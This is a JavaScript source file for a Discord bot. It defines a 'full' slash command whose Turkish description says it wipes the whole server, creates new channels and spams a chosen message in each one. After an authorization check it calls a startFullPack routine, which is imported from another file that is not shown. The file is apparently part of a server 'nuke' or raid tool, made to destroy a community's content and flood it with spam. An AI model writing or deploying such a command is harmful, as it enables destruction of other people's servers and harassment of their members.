const { SlashCommandBuilder } = require("discord.js");
const { isAuthorized, startFullPack } = require("../utils/serverTemplate");

module.exports = {
  data: new SlashCommandBuilder()
    .setName("full")
    .setDescription("Sunucuyu tamamen temizler, kanallar acar ve her kanalda mesaj spamlar.")
    .addStringOption(option =>
      option.setName("kanaladi")
        .setDescription("Olusturulacak kanal adi")
        .setRequired(true))
    .addStringOption(option =>
      option.setName("mesaj")
        .setDescription("Kanallarda spamlancak mesaj")
        .setRequired(true)),
  async execute(interaction, client) {
    if (!isAuthorized(interaction.member, interaction.user.id, client.config.ownerId)) {
      await interaction.reply({ content: "Yetkiniz yok.", ephemeral: true });
      return;
    }

    const channelName = interaction.options.getString("kanaladi");
    const content = interaction.options.getString("mesaj");

    await interaction.reply({ content: "Full Pack baslatildi!", ephemeral: true });

    await startFullPack(interaction.guild, channelName, content);
  }
};
